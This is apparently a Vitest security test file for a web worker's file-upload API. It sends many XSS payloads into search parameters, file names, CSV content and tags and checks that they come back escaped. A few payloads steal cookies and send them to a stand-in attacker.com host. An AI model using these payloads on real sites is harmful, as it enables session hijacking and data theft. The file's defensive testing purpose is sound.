/**
 * XSS Protection Security Tests
 * Tests for Cross-Site Scripting (XSS) vulnerability prevention
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { unstable_dev } from 'wrangler';
import type { UnstableDevWorker } from 'wrangler';
import { testEnv } from '../setup/test-env';

describe('XSS Protection Security Tests', () => {
  let worker: UnstableDevWorker;
  let env: any;
  let authToken: string;

  beforeEach(async () => {
    env = await testEnv();
    worker = await unstable_dev('src/index.ts', {
      experimental: { disableExperimentalWarning: true },
    });

    // Set up authenticated user for tests
    await worker.fetch('/api/accounts/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'xss_test_user',
        password: 'SecurePass123!',
        email: 'xss@test.com'
      })
    });

    const loginResponse = await worker.fetch('/api/accounts/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'xss_test_user',
        password: 'SecurePass123!'
      })
    });

    const { access_token } = await loginResponse.json();
    authToken = access_token;
  });

  describe('Reflected XSS Prevention', () => {
    it('should prevent script injection in search parameters', async () => {
      const xssPayloads = [
        '<script>alert(1)</script>',
        '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
        '<script>fetch("http://attacker.com/steal", {method: "POST", body: document.cookie})</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<style>@import "javascript:alert(1)"</style>',
        '<base href="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<form action="javascript:alert(1)"><input type="submit"></form>',
        '<button onclick="alert(1)">Click</button>',
        '<input type="button" onclick="alert(1)" value="Click">',
        '<body onload="alert(1)">',
        '<div onmouseover="alert(1)">Hover</div>',
        '<a href="javascript:alert(1)">Click</a>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:alert(1)',
        'mhtml:http://attacker.com/xss.html',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</script><script>alert(1)</script>',
        '<script>/*',
        '*/alert(1)</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>eval(\'alert(1)\')</script>',
        '<script>Function(\'alert(1)\')()</script>',
        '<script>setTimeout(\'alert(1)\',0)</script>',
        '<script>setInterval(\'alert(1)\',0)</script>',
        '<script>requestAnimationFrame(function(){alert(1)})</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await worker.fetch(`/api/list_cutter/files/search?query=${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        expect(response.status).toBeOneOf([200, 400]);
        
        if (response.status === 200) {
          const body = await response.json();
          const responseText = JSON.stringify(body);
          
          // Response should not contain unescaped script tags
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('javascript:');
          expect(responseText).not.toContain('vbscript:');
          expect(responseText).not.toContain('data:text/html');
          expect(responseText).not.toContain('onerror=');
          expect(responseText).not.toContain('onload=');
          expect(responseText).not.toContain('onclick=');
          expect(responseText).not.toContain('onmouseover=');
          expect(responseText).not.toContain('alert(1)');
        }
      }
    });

    it('should prevent XSS in error messages', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '"><script>alert("XSS")</script>'
      ];

      for (const payload of xssPayloads) {
        // Try to trigger error with XSS payload
        const response = await worker.fetch('/api/accounts/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: payload,
            password: 'wrongpassword'
          })
        });

        expect(response.status).toBe(401);
        const body = await response.json();
        const responseText = JSON.stringify(body);
        
        // Error message should not contain unescaped script content
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror=');
        expect(responseText).not.toContain('alert(');
      }
    });

    it('should prevent XSS in URL parameters', async () => {
      const xssPayloads = [
        '<script>alert(1)</script>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '"><script>alert(1)</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await worker.fetch(`/api/list_cutter/files/${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        if (response.status !== 404) {
          const body = await response.text();
          expect(body).not.toContain('<script>');
          expect(body).not.toContain('javascript:');
          expect(body).not.toContain('alert(1)');
        }
      }
    });
  });

  describe('Stored XSS Prevention', () => {
    it('should prevent XSS in uploaded file names', async () => {
      const xssFilenames = [
        '<script>alert("XSS")</script>.csv',
        'file<img src=x onerror=alert("XSS")>.csv',
        'file"><script>alert("XSS")</script>.csv',
        "file'><script>alert('XSS')</script>.csv",
        'file.csv<svg onload=alert("XSS")>',
        'javascript:alert("XSS").csv',
        'data:text/html,<script>alert("XSS")</script>.csv'
      ];

      for (const filename of xssFilenames) {
        const csvContent = 'name,age\nJohn,25';
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), filename);

        const uploadResponse = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        if (uploadResponse.status === 200) {
          const uploadBody = await uploadResponse.json();
          
          // Stored filename should be sanitized
          expect(uploadBody.filename).not.toContain('<script>');
          expect(uploadBody.filename).not.toContain('<img');
          expect(uploadBody.filename).not.toContain('<svg');
          expect(uploadBody.filename).not.toContain('javascript:');
          expect(uploadBody.filename).not.toContain('onerror=');
          expect(uploadBody.filename).not.toContain('onload=');
          expect(uploadBody.filename).not.toContain('alert(');

          // Retrieve file list and verify sanitization persists
          const listResponse = await worker.fetch('/api/list_cutter/files', {
            headers: {
              'Authorization': `Bearer ${authToken}`,
              'Content-Type': 'application/json'
            }
          });

          if (listResponse.status === 200) {
            const listBody = await listResponse.json();
            const fileListText = JSON.stringify(listBody);
            
            expect(fileListText).not.toContain('<script>');
            expect(fileListText).not.toContain('<img');
            expect(fileListText).not.toContain('<svg');
            expect(fileListText).not.toContain('javascript:');
            expect(fileListText).not.toContain('onerror=');
            expect(fileListText).not.toContain('onload=');
            expect(fileListText).not.toContain('alert(');
          }
        }
      }
    });

    it('should prevent XSS in CSV data content', async () => {
      const xssContent = `name,age,description
John,25,"<script>alert('XSS from CSV')</script>"
Jane,30,"<img src=x onerror=alert('XSS')>"
Bob,35,"javascript:alert('XSS')"
Alice,28,'"><script>alert("XSS")</script>'`;

      const formData = new FormData();
      formData.append('file', new Blob([xssContent], { type: 'text/csv' }), 'xss_test.csv');

      const uploadResponse = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      if (uploadResponse.status === 200) {
        const { file_id } = await uploadResponse.json();

        // Retrieve processed CSV data
        const dataResponse = await worker.fetch(`/api/list_cutter/files/${file_id}/data`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        if (dataResponse.status === 200) {
          const dataBody = await dataResponse.json();
          const dataText = JSON.stringify(dataBody);
          
          // Data should be escaped or sanitized
          expect(dataText).not.toContain('<script>alert(');
          expect(dataText).not.toContain('<img src=x onerror=');
          expect(dataText).not.toContain('javascript:alert(');
          expect(dataText).not.toContain('"><script>');
        }
      }
    });

    it('should prevent XSS in file tags/metadata', async () => {
      // Upload a file first
      const csvContent = 'name,age\nJohn,25';
      const formData = new FormData();
      formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'tag_test.csv');

      const uploadResponse = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      const { file_id } = await uploadResponse.json();

      const xssTags = [
        '<script>alert("XSS in tags")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '"><script>alert("XSS")</script>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const tag of xssTags) {
        const tagResponse = await worker.fetch(`/api/list_cutter/files/${file_id}/tags`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            tags: [tag, 'legitimate-tag']
          })
        });

        if (tagResponse.status === 200) {
          // Retrieve tags and verify they're sanitized
          const getTagsResponse = await worker.fetch(`/api/list_cutter/files/${file_id}`, {
            headers: {
              'Authorization': `Bearer ${authToken}`,
              'Content-Type': 'application/json'
            }
          });

          if (getTagsResponse.status === 200) {
            const fileData = await getTagsResponse.json();
            const tagsText = JSON.stringify(fileData.tags || []);
            
            expect(tagsText).not.toContain('<script>');
            expect(tagsText).not.toContain('<img');
            expect(tagsText).not.toContain('<svg');
            expect(tagsText).not.toContain('<iframe');
            expect(tagsText).not.toContain('javascript:');
            expect(tagsText).not.toContain('onerror=');
            expect(tagsText).not.toContain('onload=');
            expect(tagsText).not.toContain('alert(');
          }
        }
      }
    });
  });

  describe('DOM-based XSS Prevention', () => {
    it('should prevent XSS in JSON responses', async () => {
      // Upload file with XSS payload in data
      const xssContent = 'name,description\nTest,"</script><script>alert(\'DOM XSS\')</script>"';
      const formData = new FormData();
      formData.append('file', new Blob([xssContent], { type: 'text/csv' }), 'dom_xss_test.csv');

      const uploadResponse = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      if (uploadResponse.status === 200) {
        const { file_id } = await uploadResponse.json();

        // Get file data as JSON
        const response = await worker.fetch(`/api/list_cutter/files/${file_id}/data`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        if (response.status === 200) {
          const body = await response.json();
          const responseText = JSON.stringify(body);
          
          // Should not contain unescaped script tags that could be interpreted by DOM
          expect(responseText).not.toContain('</script><script>');
          expect(responseText).not.toContain('<script>alert(');
          
          // Verify proper JSON escaping
          if (responseText.includes('DOM XSS')) {
            expect(responseText).toContain('\\"DOM XSS\\"');
            expect(responseText).not.toContain('"DOM XSS"');
          }
        }
      }
    });

    it('should set proper Content-Type headers to prevent MIME sniffing', async () => {
      const response = await worker.fetch('/api/list_cutter/files', {
        headers: {
          'Authorization': `Bearer ${authToken}`,
          'Content-Type': 'application/json'
        }
      });

      expect(response.headers.get('Content-Type')).toContain('application/json');
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
    });

    it('should prevent XSS via file downloads', async () => {
      // Upload HTML file disguised as CSV
      const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head><title>Fake CSV</title></head>
        <body>
          <script>alert('XSS via download')</script>
          name,age
          John,25
        </body>
        </html>
      `;

      const formData = new FormData();
      formData.append('file', new Blob([htmlContent], { type: 'text/csv' }), 'fake.csv');

      const uploadResponse = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      if (uploadResponse.status === 200) {
        const { file_id } = await uploadResponse.json();

        // Download the file
        const downloadResponse = await worker.fetch(`/api/list_cutter/files/${file_id}/download`, {
          headers: {
            'Authorization': `Bearer ${authToken}`
          }
        });

        if (downloadResponse.status === 200) {
          // Should force download, not execute
          expect(downloadResponse.headers.get('Content-Disposition')).toContain('attachment');
          expect(downloadResponse.headers.get('Content-Type')).toBe('text/csv');
          expect(downloadResponse.headers.get('X-Content-Type-Options')).toBe('nosniff');
        }
      }
    });
  });

  describe('CSP (Content Security Policy) Enforcement', () => {
    it('should include CSP headers in responses', async () => {
      const response = await worker.fetch('/', {
        headers: {
          'Accept': 'text/html'
        }
      });

      const csp = response.headers.get('Content-Security-Policy');
      if (csp) {
        // Should restrict script sources
        expect(csp).toContain("script-src 'self'");
        expect(csp).not.toContain("script-src 'unsafe-inline'");
        expect(csp).not.toContain("script-src 'unsafe-eval'");
        
        // Should restrict object sources
        expect(csp).toContain("object-src 'none'");
        
        // Should restrict base URI
        expect(csp).toContain("base-uri 'self'");
      }
    });

    it('should prevent inline script execution via CSP', async () => {
      // This test would require a full HTML page to verify CSP enforcement
      // For now, we just check that CSP header is present
      const response = await worker.fetch('/', {
        headers: {
          'Accept': 'text/html'
        }
      });

      const csp = response.headers.get('Content-Security-Policy');
      expect(csp).toBeTruthy();
    });
  });

  describe('Input Encoding and Escaping', () => {
    it('should properly encode special characters in JSON responses', async () => {
      const specialChars = [
        '<',
        '>',
        '"',
        "'",
        '&',
        '\n',
        '\r',
        '\t',
        '\0',
        '\x08',
        '\f',
        '\v'
      ];

      for (const char of specialChars) {
        const response = await worker.fetch(`/api/list_cutter/files/search?query=${encodeURIComponent(char)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        if (response.status === 200) {
          const body = await response.json();
          const responseText = JSON.stringify(body);
          
          // Special characters should be properly escaped in JSON
          if (responseText.includes(char)) {
            switch (char) {
              case '<':
                expect(responseText).toContain('\\u003c');
                break;
              case '>':
                expect(responseText).toContain('\\u003e');
                break;
              case '"':
                expect(responseText).toContain('\\"');
                break;
              case '\\':
                expect(responseText).toContain('\\\\');
                break;
              case '\n':
                expect(responseText).toContain('\\n');
                break;
              case '\r':
                expect(responseText).toContain('\\r');
                break;
              case '\t':
                expect(responseText).toContain('\\t');
                break;
            }
          }
        }
      }
    });

    it('should handle Unicode XSS attempts', async () => {
      const unicodeXSSPayloads = [
        '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded
        '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E', // Unicode escaped
        '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E', // Hex escaped
        '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML entities
        '&#60;script&#62;alert(1)&#60;/script&#62;', // Decimal entities
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', // Hex entities
        '\u003Cscript\u003Ealert(1)\u003C/script\u003E', // Actual Unicode
        String.fromCharCode(60) + 'script' + String.fromCharCode(62) + 'alert(1)' + String.fromCharCode(60) + '/script' + String.fromCharCode(62)
      ];

      for (const payload of unicodeXSSPayloads) {
        const response = await worker.fetch(`/api/list_cutter/files/search?query=${encodeURIComponent(payload)}`, {
          headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
          }
        });

        if (response.status === 200) {
          const body = await response.json();
          const responseText = JSON.stringify(body);
          
          expect(responseText).not.toContain('<script>alert(1)</script>');
          expect(responseText).not.toContain('alert(1)');
        }
      }
    });
  });

  afterEach(async () => {
    await worker.stop();
  });
});